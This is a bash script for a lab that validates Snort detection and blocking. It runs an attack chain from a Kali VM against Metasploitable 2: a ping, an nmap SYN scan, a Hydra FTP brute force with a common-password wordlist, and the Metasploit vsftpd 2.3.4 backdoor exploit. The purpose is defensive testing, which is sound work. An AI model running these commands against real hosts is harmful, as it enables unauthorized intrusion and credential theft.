#!/bin/bash
# attack_simulator.sh
# Executes the four-vector attack chain against Metasploitable from
# the Attacker Kali VM. Used to validate Snort detection (Stage 1)
# and blocking (Stage 2).
#
# Targets: 192.168.50.10  (Metasploitable 2)
# Source : 10.10.10.10    (Attacker Kali)
# All traffic transits the Analyzer (10.10.10.1 / 192.168.50.1)
#
# Run on the Attacker VM. Requires root for nmap SYN scan.

TARGET="192.168.*.*"
LHOST="10.10.*.*"
WORDLIST="/tmp/wordlist.txt"

# -------------------------------------------------------------------
# Generate a small wordlist for the FTP brute force
# -------------------------------------------------------------------
cat > "$WORDLIST" <<EOF
admin
password
123456
msfadmin
root
toor
test
qwerty
letmein
EOF

echo "================================================="
echo "  Attack 1/4 — ICMP reconnaissance"
echo "================================================="
ping -c 4 "$TARGET"

echo ""
echo "================================================="
echo "  Attack 2/4 — Nmap SYN scan"
echo "================================================="
sudo nmap -sS "$TARGET"

echo ""
echo "================================================="
echo "  Attack 3/4 — Hydra FTP brute force"
echo "================================================="
hydra -l msfadmin -P "$WORDLIST" "ftp://$TARGET"

echo ""
echo "================================================="
echo "  Attack 4/4 — vsftpd 2.3.4 backdoor (Metasploit)"
echo "================================================="
msfconsole -q -x "
use exploit/unix/ftp/vsftpd_234_backdoor;
set RHOSTS $TARGET;
set LHOST $LHOST;
run;
exit
"

echo ""
echo "[+] Attack chain complete."
